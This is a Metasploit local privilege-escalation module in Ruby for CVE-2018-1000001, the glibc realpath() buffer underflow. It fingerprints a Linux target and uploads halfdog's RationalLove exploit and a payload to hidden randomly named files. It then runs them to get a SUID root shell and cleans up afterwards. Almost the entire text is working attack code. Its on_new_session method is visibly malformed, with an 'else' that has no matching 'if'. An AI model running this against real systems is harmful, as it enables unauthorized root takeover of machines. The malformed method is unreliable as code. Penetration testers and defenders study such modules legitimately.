# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking
 
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => "glibc &#039;realpath()&#039; Privilege Escalation",
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on Linux systems by abusing
        a vulnerability in GNU C Library (glibc) version 2.26 and prior.
 
        This module uses halfdog&#039;s RationalLove exploit to exploit a buffer
        underflow in glibc realpath() and create a SUID root shell. The exploit
        has offsets for glibc versions 2.23-0ubuntu9 and 2.24-11+deb9u1.
 
        The target system must have unprivileged user namespaces enabled.
 
        This module has been tested successfully on Ubuntu Linux 16.04.3 (x86_64)
        with glibc version 2.23-0ubuntu9; and Debian 9.0 (x86_64) with glibc
        version 2.24-11+deb9u1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;halfdog&#039;,      # Discovery and RationalLove.c exploit
          &#039;Brendan Coles&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Jan 16 2018&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;Privileged&#039;     => true,
      &#039;References&#039;     =>
        [
          [ &#039;AKA&#039;, &#039;RationalLove.c&#039; ],
          [ &#039;BID&#039;, &#039;102525&#039; ],
          [ &#039;CVE&#039;, &#039;2018-1000001&#039; ],
          [ &#039;EDB&#039;, &#039;43775&#039; ],
          [ &#039;URL&#039;, &#039;https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/&#039; ],
          [ &#039;URL&#039;, &#039;http://www.openwall.com/lists/oss-security/2018/01/11/5&#039; ],
          [ &#039;URL&#039;, &#039;https://securitytracker.com/id/1040162&#039; ],
          [ &#039;URL&#039;, &#039;https://sourceware.org/bugzilla/show_bug.cgi?id=22679&#039; ],
          [ &#039;URL&#039;, &#039;https://usn.ubuntu.com/3534-1/&#039; ],
          [ &#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=1533836&#039; ]
        ],
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptEnum.new(&#039;COMPILE&#039;, [ true, &#039;Compile on target&#039;, &#039;Auto&#039;, %w(Auto True False) ]),
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ]),
    ]
  end
 
  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end
 
  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    write_file path, data
    register_file_for_cleanup path
  end
 
  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
  end
 
  def upload_and_compile(path, data)
    upload "#{path}.c", data
 
    gcc_cmd = "gcc -w -o #{path} #{path}.c"
    if session.type.eql? &#039;shell&#039;
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd
 
    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end
 
    register_file_for_cleanup path
    cmd_exec "chmod +x #{path}"
  end
 
  def exploit_data(file)
    path = ::File.join Msf::Config.data_directory, &#039;exploits&#039;, &#039;cve-2018-1000001&#039;, file
    fd = ::File.open path, &#039;rb&#039;
    data = fd.read fd.stat.size
    fd.close
    data
  end
 
  def live_compile?
    return false unless datastore[&#039;COMPILE&#039;].eql?(&#039;Auto&#039;) || datastore[&#039;COMPILE&#039;].eql?(&#039;True&#039;)
 
    if has_gcc?
      vprint_good &#039;gcc is installed&#039;
      return true
    end
 
    unless datastore[&#039;COMPILE&#039;].eql? &#039;Auto&#039;
      fail_with Failure::BadConfig, &#039;gcc is not installed. Compiling will fail.&#039;
    end
  end
 
  def check
    version = kernel_release
    if Gem::Version.new(version.split(&#039;-&#039;).first) < Gem::Version.new(&#039;2.6.36&#039;)
      vprint_error "Linux kernel version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Linux kernel version #{version} is vulnerable"
 
    arch = kernel_hardware
    unless arch.include? &#039;x86_64&#039;
      vprint_error "System architecture #{arch} is not supported"
      return CheckCode::Safe
    end
    vprint_good "System architecture #{arch} is supported"
 
    unless userns_enabled?
      vprint_error &#039;Unprivileged user namespaces are not permitted&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;Unprivileged user namespaces are permitted&#039;
 
    version = glibc_version
    if Gem::Version.new(version.split(&#039;-&#039;).first) > Gem::Version.new(&#039;2.26&#039;)
      vprint_error "GNU C Library version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "GNU C Library version #{version} is vulnerable"
 
    # fuzzy match glibc 2.23-0ubuntu9 and 2.24-11+deb9u1
    glibc_banner = cmd_exec(&#039;ldd --version&#039;)
    unless glibc_banner.include?(&#039;2.23-0ubuntu&#039;) || glibc_banner.include?(&#039;2.24-11+deb9&#039;)
      vprint_error &#039;No offsets for this version of GNU C Library&#039;
      return CheckCode::Safe
    end
 
    CheckCode::Appears
  end
 
  def exploit
    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end
 
    if check != CheckCode::Appears
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end
 
    unless cmd_exec("test -w &#039;#{base_dir}&#039; && echo true").include? &#039;true&#039;
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end
 
    # Upload exploit executable
    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
    @executable_path = "#{base_dir}/#{executable_name}"
    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;
      upload_and_compile @executable_path, exploit_data(&#039;RationalLove.c&#039;)
    else
      upload_and_chmodx @executable_path, exploit_data(&#039;RationalLove&#039;)
    end
 
    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe
 
    # Launch exploit
    print_status &#039;Launching exploit...&#039;
    output = cmd_exec "echo &#039;#{payload_path} & exit&#039; | #{@executable_path}", nil, 30
    output.each_line { |line| vprint_status line.chomp }
  end
 
  def on_new_session(client)
    # remove root owned SUID executable
      client.core.use &#039;stdapi&#039; unless client.ext.aliases.include? &#039;stdapi&#039;
      client.fs.file.rm @executable_path
    else
      client.shell_command_token "rm #{@executable_path}"
    end
  end
end

